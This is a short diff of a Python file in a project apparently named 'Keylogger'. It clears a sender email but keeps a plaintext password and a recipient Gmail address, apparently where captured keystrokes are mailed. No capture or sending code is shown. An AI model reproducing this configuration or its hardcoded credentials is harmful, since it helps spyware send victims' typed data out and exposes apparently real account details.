@@ -42,7 +42,7 @@ file_path = "C:\\Users\\user\\Desktop\\Keylogger\\Project"
 extend = "\\"
 file_merge = file_path + extend
 
-email = "phishprotect@gmail.com"
+email = ""
 password = "deepak@1"
 
 toaddress = "deepakkumarjha178531@gmail.com"
